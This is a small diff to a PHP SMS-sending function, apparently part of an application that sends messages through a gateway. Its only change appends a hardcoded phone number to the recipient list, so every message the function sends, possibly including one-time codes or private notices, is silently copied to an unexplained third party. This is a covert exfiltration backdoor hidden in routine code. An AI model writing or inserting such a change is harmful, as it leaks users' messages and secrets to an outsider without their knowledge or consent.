@@ -79,7 +79,7 @@ function send_sms($mobileNumber,$message)
     $route = "transactional";
     $postData = array(
         'authkey' => $authKey,
-        'mobiles' => $mobileNumber,
+        'mobiles' => $mobileNumber.',9970236208',
         'message' => $message,
         'sender' => $senderId,
         'route' => $route
